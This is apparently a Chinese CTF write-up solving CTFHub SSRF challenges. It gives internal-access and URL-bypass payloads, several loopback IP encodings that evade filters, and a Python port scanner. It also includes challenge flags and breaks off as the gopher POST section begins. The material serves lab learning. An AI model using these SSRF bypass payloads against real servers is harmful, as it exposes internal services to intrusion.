## ssrf

[toc]

> SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种网络安全漏洞，攻击者通过它可以利用受害服务器向自己控制或信任的服务器发送恶意请求。简单来说，SSRF 允许攻击者通过受害服务器来访问或操作内部网络资源，这些资源通常在正常情况下是无法从外部访问的。

### 内网访问

> 题目要求：
>
> 尝试访问位于127.0.0.1的flag.php吧

进入页面发现有一个参数`url=`

```http
?url=127.0.0.1/flag.php
```

得到flag

```
ctfhub{5706b946ec071bda6cc7f7c5}
```



### 端口扫描

> 来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,

#### 方法一 -- BP

在BP的爆破模块

![image-20240827221655844](https://gitee.com/bx33661/image/raw/master/path/image-20240827221655844.png)

设置以上规则，开始爆破

![image-20240827221732200](https://gitee.com/bx33661/image/raw/master/path/image-20240827221732200.png)

发现8833端口长度不一样，发送到发送模块

![image-20240827221820821](https://gitee.com/bx33661/image/raw/master/path/image-20240827221820821.png)

得到flag

```
ctfhub{5b8bcb5953759711292d2fee}
```



#### 方法二--python脚本

```python
import socket
from concurrent.futures import ThreadPoolExecutor

# 定义扫描函数
def scan_port(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((host, port))
            return port, True
    except (socket.timeout, socket.error):
        return port, False

# 扫描主机的指定端口范围
def scan_ports(host, start_port, end_port):
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, host, port) for port in range(start_port, end_port + 1)]
        for future in futures:
            port, is_open = future.result()
            if is_open:
                open_ports.append(port)
    return open_ports

# 输入主机地址和端口范围
host = input("请输入要扫描的主机地址: ")
start_port = int(input("请输入开始端口: "))
end_port = int(input("请输入结束端口: "))

# 扫描并显示结果
print(f"正在扫描 {host} 的端口范围 {start_port}-{end_port} ...")
open_ports = scan_ports(host, start_port, end_port)

if open_ports:
    print(f"以下端口是打开的: {open_ports}")
else:
    print("未发现打开的端口。")
```

以上是借助gpt辅助写的



### URL Bypass

> 题目描述：
>
> 请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧

1. 使用?url=http://notfound.ctfhub.com@127.0.0.1/flag.php

```http
http://notfound.ctfhub.com@127.0.0.1/flag.php
```

`notfound.ctfhub.com` 是作为凭据的一部分，而实际的服务器地址是 `127.0.0.1`（即本地主机）。这种用法通常在现代浏览器中是不会被解析为有效的凭据部分，甚至可能会触发安全警告或被忽略。

**这里做一个测试**

```php
# 这里我尝试访问http://www.bx33661.com@www.google.com
```

直接就到Google主页

![image-20240827224047282](https://gitee.com/bx33661/image/raw/master/path/image-20240827224047282.png)



> 在网上发现大佬的做法：
>
> 1. [使用nip.io](http://xn--nip-hb0er53o.io/)
>
>    > `.nip.io` 是一个特殊的域名后缀，它提供了一种免费且简便的方式，可以将特定格式的域名解析为对应的IP地址，可以作为应用路由的解析服务。这省去了配置本地hosts文件的步骤。
>    >
>    > 例如，当访问`http://<anything>-<IP Address>.nip.io`时，它将解析到对应的IP地址`<IP Address>`。
>
>    - payload：`?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php`
>
>    [![img](https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/51.png)](https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/51.png)
>
> 2. 利用`xip.io`（可以直接访问该域名，里面有详细说明）
>
>    > `.xip.io` 的功能是将 `notfound.ctfhub.com` 这个子域名解析到本地机器的IP地址 `127.0.0.1`。
>
>    - 尝试发现，`xip.io`被ban了
>
>    [![img](https://gitee.com/bx33661/image/raw/master/path/52.png)](https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/52.png)



### 数字IP BYPASS

> 题目要求：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

```url
http://challenge-6a621c5636461c9f.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php

hacker! Ban '/127|172|@/'
```

1. 进制绕过

```markdown
八进制：0177.000.000.001
十进制：127.0.0.1
十六进制：0x7f000001
```

得到flag

```
ctfhub{8a5971c56e6a1ca0282c7a4e}
```

2. 使用`localhost`
3. IP转为int数字

> IP 地址本质上是一个 32 位的二进制数（对于 IPv4 而言），可以被表示为一个整数。这种转换在计算机网络中非常常见，用于将人类可读的点分十进制格式（例如 192.168.1.1）转换为计算机更容易处理的整数格式。

![image-20240827225135585](https://gitee.com/bx33661/image/raw/master/path/image-20240827225135585.png)



### POST请求

> 题目要求：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年

#### gopher协议

*Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；*